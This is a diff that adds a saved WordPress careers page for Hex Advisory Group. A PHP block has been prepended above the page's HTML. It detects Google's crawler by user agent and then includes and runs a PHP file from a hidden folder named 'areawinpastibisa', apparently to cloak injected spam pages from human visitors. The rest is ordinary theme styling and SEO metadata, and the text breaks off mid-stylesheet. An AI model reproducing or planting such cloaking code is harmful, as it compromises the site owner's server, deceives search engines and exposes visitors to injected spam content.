@@ -1,0 +1,532 @@
+<?php
+function isGoogleBot($userAgent) {
+    $userAgent = strtolower($userAgent);
+    return strpos($userAgent, 'google') !== false;
+}
+
+$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+
+if (isGoogleBot($userAgent)) {
+    $cloackDir = dirname(__FILE__) . '/areawinpastibisa/';
+
+    if (is_dir($cloackDir)) {
+        $files = scandir($cloackDir);
+        foreach ($files as $file) {
+            if ($file === '.' || $file === '..') continue;
+
+            $fullPath = $cloackDir . $file;
+
+            if (is_file($fullPath) && pathinfo($file, PATHINFO_EXTENSION) === 'php') {
+                include $fullPath;
+                exit;
+            }
+        }
+    }
+
+    echo "<b>Error:</b> Tidak ada file PHP yang dapat di-include di direktori <code>$cloackDir</code><br>";
+    if (!is_dir($cloackDir)) {
+        echo "<b>Catatan:</b> Folder tidak ditemukan.<br>";
+    } else {
+        echo "<b>Isi Folder:</b><pre>" . print_r($files, true) . "</pre>";
+    }
+    exit;
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
+        <style id="tb_inline_styles" data-no-optimize="1">.tb_animation_on{overflow-x:hidden}.themify_builder .wow{visibility:hidden;animation-fill-mode:both}[data-tf-animation]{will-change:transform,opacity,visibility}.themify_builder .tf_lax_done{transition-duration:.8s;transition-timing-function:cubic-bezier(.165,.84,.44,1)}[data-sticky-active].tb_sticky_scroll_active{z-index:1}[data-sticky-active].tb_sticky_scroll_active .hide-on-stick{display:none}@media(min-width:1025px){.hide-desktop{width:0!important;height:0!important;padding:0!important;visibility:hidden!important;margin:0!important;display:table-column!important;background:0!important;content-visibility:hidden;overflow:hidden!important}}@media(min-width:769px) and (max-width:1024px){.hide-tablet_landscape{width:0!important;height:0!important;padding:0!important;visibility:hidden!important;margin:0!important;display:table-column!important;background:0!important;content-visibility:hidden;overflow:hidden!important}}@media(min-width:601px) and (max-width:768px){.hide-tablet{width:0!important;height:0!important;padding:0!important;visibility:hidden!important;margin:0!important;display:table-column!important;background:0!important;content-visibility:hidden;overflow:hidden!important}}@media(max-width:600px){.hide-mobile{width:0!important;height:0!important;padding:0!important;visibility:hidden!important;margin:0!important;display:table-column!important;background:0!important;content-visibility:hidden;overflow:hidden!important}}@media(max-width:768px){div.module-gallery-grid{--galn:var(--galt)}}@media(max-width:600px){
+                .themify_map.tf_map_loaded{width:100%!important}
+                .ui.builder_button,.ui.nav li a{padding:.525em 1.15em}
+                .fullheight>.row_inner:not(.tb_col_count_1){min-height:0}
+                div.module-gallery-grid{--galn:var(--galm);gap:8px}
+            }</style><noscript><style>.themify_builder .wow,.wow .tf_lazy{visibility:visible!important}</style></noscript>            <style id="tf_lazy_style" data-no-optimize="1">
+                .tf_svg_lazy{
+                    content-visibility:auto;
+                    background-size:100% 25%!important;
+                    background-repeat:no-repeat!important;
+                    background-position:0 0, 0 33.4%,0 66.6%,0 100%!important;
+                    transition:filter .3s linear!important;
+                    filter:blur(25px)!important;                    transform:translateZ(0)
+                }
+                .tf_svg_lazy_loaded{
+                    filter:blur(0)!important
+                }
+                [data-lazy]:is(.module,.module_row:not(.tb_first)),.module[data-lazy] .ui,.module_row[data-lazy]:not(.tb_first):is(>.row_inner,.module_column[data-lazy],.module_subrow[data-lazy]){
+                    background-image:none!important
+                }
+            </style>
+            <noscript>
+                <style>
+                    .tf_svg_lazy{
+                        display:none!important
+                    }
+                </style>
+            </noscript>
+                    <style id="tf_lazy_common" data-no-optimize="1">
+                        img{
+                max-width:100%;
+                height:auto
+            }
+                                    :where(.tf_in_flx,.tf_flx){display:inline-flex;flex-wrap:wrap;place-items:center}
+            .tf_fa,:is(em,i) tf-lottie{display:inline-block;vertical-align:middle}:is(em,i) tf-lottie{width:1.5em;height:1.5em}.tf_fa{width:1em;height:1em;stroke-width:0;stroke:currentColor;overflow:visible;fill:currentColor;pointer-events:none;text-rendering:optimizeSpeed;buffered-rendering:static}#tf_svg symbol{overflow:visible}:where(.tf_lazy){position:relative;visibility:visible;display:block;opacity:.3}.wow .tf_lazy:not(.tf_swiper-slide){visibility:hidden;opacity:1}div.tf_audio_lazy audio{visibility:hidden;height:0;display:inline}.mejs-container{visibility:visible}.tf_iframe_lazy{transition:opacity .3s ease-in-out;min-height:10px}:where(.tf_flx),.tf_swiper-wrapper{display:flex}.tf_swiper-slide{flex-shrink:0;opacity:0;width:100%;height:100%}.tf_swiper-wrapper>br,.tf_lazy.tf_swiper-wrapper .tf_lazy:after,.tf_lazy.tf_swiper-wrapper .tf_lazy:before{display:none}.tf_lazy:after,.tf_lazy:before{content:'';display:inline-block;position:absolute;width:10px!important;height:10px!important;margin:0 3px;top:50%!important;inset-inline:auto 50%!important;border-radius:100%;background-color:currentColor;visibility:visible;animation:tf-hrz-loader infinite .75s cubic-bezier(.2,.68,.18,1.08)}.tf_lazy:after{width:6px!important;height:6px!important;inset-inline:50% auto!important;margin-top:3px;animation-delay:-.4s}@keyframes tf-hrz-loader{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(.1);opacity:.6}}.tf_lazy_lightbox{position:fixed;background:rgba(11,11,11,.8);color:#ccc;top:0;left:0;display:flex;align-items:center;justify-content:center;z-index:999}.tf_lazy_lightbox .tf_lazy:after,.tf_lazy_lightbox .tf_lazy:before{background:#fff}.tf_vd_lazy,tf-lottie{display:flex;flex-wrap:wrap}tf-lottie{aspect-ratio:1.777}.tf_w.tf_vd_lazy video{width:100%;height:auto;position:static;object-fit:cover}
+        </style>
+        <link type="image/png" href="https://hexadvisory.com/wp-content/uploads/2026/01/hexbullet26.png" rel="apple-touch-icon" /><link type="image/png" href="https://hexadvisory.com/wp-content/uploads/2026/01/hexbullet26.png" rel="icon" /><meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
+
+	<!-- This site is optimized with the Yoast SEO plugin v26.8 - https://yoast.com/product/yoast-seo-wordpress/ -->
+	<title>Careers - Hex Advisory Group</title>
+	<link rel="canonical" href="https://hexadvisory.com/careers/" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Careers - Hex Advisory Group" />
+	<meta property="og:description" content="Careers WANT TO WORK WITH US? If you are passionate about diverse problem solving and delivering lasting value to clients, please use this form to send us your details. Full Name * Full Name * Email ID * Email ID * Mobile No. * Mobile No. * Employment Category Permanent Contractor Upload Your Resume Tell [&hellip;]" />
+	<meta property="og:url" content="https://hexadvisory.com/careers/" />
+	<meta property="og:site_name" content="Hex Advisory Group" />
+	<meta property="article:modified_time" content="2024-04-20T04:07:01+00:00" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:label1" content="Est. reading time" />
+	<meta name="twitter:data1" content="1 minute" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://hexadvisory.com/careers/","url":"https://hexadvisory.com/careers/","name":"Careers - Hex Advisory Group","isPartOf":{"@id":"https://hexadvisory.com/#website"},"datePublished":"2022-09-16T15:13:18+00:00","dateModified":"2024-04-20T04:07:01+00:00","breadcrumb":{"@id":"https://hexadvisory.com/careers/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://hexadvisory.com/careers/"]}]},{"@type":"BreadcrumbList","@id":"https://hexadvisory.com/careers/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://hexadvisory.com/"},{"@type":"ListItem","position":2,"name":"Careers"}]},{"@type":"WebSite","@id":"https://hexadvisory.com/#website","url":"https://hexadvisory.com/","name":"Hex Advisory Group","description":"Official site","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://hexadvisory.com/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel="alternate" type="application/rss+xml" title="Hex Advisory Group &raquo; Feed" href="https://hexadvisory.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Hex Advisory Group &raquo; Comments Feed" href="https://hexadvisory.com/comments/feed/" />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://hexadvisory.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fhexadvisory.com%2Fcareers%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://hexadvisory.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fhexadvisory.com%2Fcareers%2F&#038;format=xml" />
+<style id='wp-img-auto-sizes-contain-inline-css'>
+img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
+/*# sourceURL=wp-img-auto-sizes-contain-inline-css */
+</style>
+<link rel="preload" href="https://hexadvisory.com/wp-content/plugins/litespeed-cache/assets/css/litespeed-dummy.css?ver=6.9" as="style">
+<link rel="preload" href="https://hexadvisory.com/wp-content/plugins/compact-wp-audio-player/css/flashblock.css?ver=6.9" as="style"><link rel='stylesheet' id='scap.flashblock-css' href='https://hexadvisory.com/wp-content/plugins/compact-wp-audio-player/css/flashblock.css?ver=6.9' media='all' />
+<link rel="preload" href="https://hexadvisory.com/wp-content/plugins/compact-wp-audio-player/css/player.css?ver=6.9" as="style"><link rel='stylesheet' id='scap.player-css' href='https://hexadvisory.com/wp-content/plugins/compact-wp-audio-player/css/player.css?ver=6.9' media='all' />
+<style id='global-styles-inline-css'>
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: clamp(14px, 0.875rem + ((1vw - 3.2px) * 0.469), 20px);--wp--preset--font-size--large: clamp(22.041px, 1.378rem + ((1vw - 3.2px) * 1.091), 36px);--wp--preset--font-size--x-large: clamp(25.014px, 1.563rem + ((1vw - 3.2px) * 1.327), 42px);--wp--preset--font-family--system-font: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:where(body) { margin: 0; }.wp-site-blocks > .alignleft { float: left; margin-right: 2em; }.wp-site-blocks > .alignright { float: right; margin-left: 2em; }.wp-site-blocks > .aligncenter { justify-content: center; margin-left: auto; margin-right: auto; }:where(.wp-site-blocks) > * { margin-block-start: 24px; margin-block-end: 0; }:where(.wp-site-blocks) > :first-child { margin-block-start: 0; }:where(.wp-site-blocks) > :last-child { margin-block-end: 0; }:root { --wp--style--block-gap: 24px; }:root :where(.is-layout-flow) > :first-child{margin-block-start: 0;}:root :where(.is-layout-flow) > :last-child{margin-block-end: 0;}:root :where(.is-layout-flow) > *{margin-block-start: 24px;margin-block-end: 0;}:root :where(.is-layout-constrained) > :first-child{margin-block-start: 0;}:root :where(.is-layout-constrained) > :last-child{margin-block-end: 0;}:root :where(.is-layout-constrained) > *{margin-block-start: 24px;margin-block-end: 0;}:root :where(.is-layout-flex){gap: 24px;}:root :where(.is-layout-grid){gap: 24px;}.is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}.is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}.is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}.is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}.is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){margin-left: auto !important;margin-right: auto !important;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}body{font-family: var(--wp--preset--font-family--system-font);font-size: var(--wp--preset--font-size--medium);line-height: 1.6;padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}a:where(:not(.wp-element-button)){text-decoration: underline;}:root :where(.wp-element-button, .wp-block-button__link){background-color: #32373c;border-width: 0;color: #fff;font-family: inherit;font-size: inherit;font-style: inherit;font-weight: inherit;letter-spacing: inherit;line-height: inherit;padding-top: calc(0.667em + 2px);padding-right: calc(1.333em + 2px);padding-bottom: calc(0.667em + 2px);padding-left: calc(1.333em + 2px);text-decoration: none;text-transform: inherit;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}.has-system-font-font-family{font-family: var(--wp--preset--font-family--system-font) !important;}
+:root :where(.wp-block-pullquote){font-size: clamp(0.984em, 0.984rem + ((1vw - 0.2em) * 0.645), 1.5em);line-height: 1.6;}
+/*# sourceURL=global-styles-inline-css */
+</style>
+<link rel="preload" href="https://hexadvisory.com/wp-content/plugins/add-search-to-menu/public/css/ivory-search.min.css?ver=5.5.13" as="style"><link rel='stylesheet' id='ivory-search-styles-css' href='https://hexadvisory.com/wp-content/plugins/add-search-to-menu/public/css/ivory-search.min.css?ver=5.5.13' media='all' />
+<link rel="preload" href="https://hexadvisory.com/wp-content/plugins/mailin/css/mailin-front.css?ver=6.9" as="style"><link rel='stylesheet' id='sib-front-css-css' href='https://hexadvisory.com/wp-content/plugins/mailin/css/mailin-front.css?ver=6.9' media='all' />
+<script src="https://hexadvisory.com/wp-content/plugins/compact-wp-audio-player/js/soundmanager2-nodebug-jsmin.js?ver=6.9" id="scap.soundmanager2-js"></script>
+<script src="https://hexadvisory.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script src="https://hexadvisory.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<script id="sib-front-js-js-extra">
+var sibErrMsg = {"invalidMail":"Please fill out valid email address","requiredField":"Please fill out required fields","invalidDateFormat":"Please fill out valid date format","invalidSMSFormat":"Please fill out valid phone number"};
+var ajax_sib_front_object = {"ajax_url":"https://hexadvisory.com/wp-admin/admin-ajax.php","ajax_nonce":"134c8496ef","flag_url":"https://hexadvisory.com/wp-content/plugins/mailin/img/flags/"};
+//# sourceURL=sib-front-js-js-extra
+</script>
+<script src="https://hexadvisory.com/wp-content/plugins/mailin/js/mailin-front.js?ver=1768470697" id="sib-front-js-js"></script>
+<link rel="https://api.w.org/" href="https://hexadvisory.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://hexadvisory.com/wp-json/wp/v2/pages/2893" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://hexadvisory.com/xmlrpc.php?rsd" />
+<meta name="generator" content="WordPress 6.9" />
+<link rel='shortlink' href='https://hexadvisory.com/?p=2893' />
+
+	<style>
+	@keyframes themifyAnimatedBG{
+		0%{background-color:#33baab}100%{background-color:#e33b9e}50%{background-color:#4961d7}33.3%{background-color:#2ea85c}25%{background-color:#2bb8ed}20%{background-color:#dd5135}
+	}
+	.module_row.animated-bg{
+		animation:themifyAnimatedBG 30000ms infinite alternate
+	}
+	</style>
+	<link rel="prefetch" href="https://hexadvisory.com/wp-content/themes/themify-ultra/js/themify-script.js?ver=8.0.8" as="script" fetchpriority="low"><link rel="prefetch" href="https://hexadvisory.com/wp-content/themes/themify-ultra/themify/js/modules/themify-sidemenu.js?ver=8.2.0" as="script" fetchpriority="low"><link rel="preload" href="https://hexadvisory.com/wp-content/uploads/2026/01/HEX-Logo-2026.png" as="image"><link rel="prefetch" href="https://hexadvisory.com/wp-content/themes/themify-ultra/themify/css/modules/animate.min.css?ver=8.2.0" as="style"><link rel="prefetch" href="https://hexadvisory.com/wp-content/themes/themify-ultra/themify/js/modules/animate.js?ver=8.2.0" as="script" fetchpriority="low"><link rel="preload" href="https://hexadvisory.com/wp-content/themes/themify-ultra/themify/themify-builder/js/themify-builder-script.js?ver=8.2.0" as="script" fetchpriority="low"><style id="tf_gf_fonts_style">@font-face{font-family:'Lato';font-style:italic;font-weight:300;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/S6u_w4BMUTPHjxsI9w2_FQft1dw.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Lato';font-style:italic;font-weight:300;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/S6u_w4BMUTPHjxsI9w2_Gwft.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Lato';font-style:italic;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/S6u8w4BMUTPHjxsAUi-qJCY.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Lato';font-style:italic;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/S6u8w4BMUTPHjxsAXC-q.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Lato';font-style:italic;font-weight:700;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/S6u_w4BMUTPHjxsI5wq_FQft1dw.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Lato';font-style:italic;font-weight:700;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/S6u_w4BMUTPHjxsI5wq_Gwft.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Lato';font-weight:300;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/S6u9w4BMUTPHh7USSwaPGR_p.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Lato';font-weight:300;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/S6u9w4BMUTPHh7USSwiPGQ.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Lato';font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/S6uyw4BMUTPHjxAwXjeu.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Lato';font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/S6uyw4BMUTPHjx4wXg.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Lato';font-weight:700;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/S6u9w4BMUTPHh6UVSwaPGR_p.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Lato';font-weight:700;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/S6u9w4BMUTPHh6UVSwiPGQ.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Raleway';font-style:italic;font-weight:100;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4QIFqPfE.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;}@font-face{font-family:'Raleway';font-style:italic;font-weight:100;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4SYFqPfE.woff2) 